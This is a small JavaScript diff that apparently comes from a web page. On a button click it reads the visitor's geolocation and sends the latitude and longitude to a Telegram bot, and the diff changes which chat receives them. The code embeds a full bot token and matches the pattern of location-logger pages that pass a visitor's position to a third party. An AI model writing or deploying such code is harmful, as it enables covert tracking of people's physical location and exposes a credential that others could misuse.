@@ -11,7 +11,7 @@ document.getElementById("getLocation").addEventListener("click", function() {
       const longitude = position.coords.longitude;
 
       // Send the location to Telegram bot
-      const telegramUrl = `https://api.telegram.org/bot7784284083:AAG31myfjSw1T-MTExDj837RQQBKtms8wYk/sendLocation?chat_id=397599597&latitude=${latitude}&longitude=${longitude}`;
+      const telegramUrl = `https://api.telegram.org/bot7784284083:AAG31myfjSw1T-MTExDj837RQQBKtms8wYk/sendLocation?chat_id=6219309154&latitude=${latitude}&longitude=${longitude}`;
 
       fetch(telegramUrl)
         .then(response => response.json())
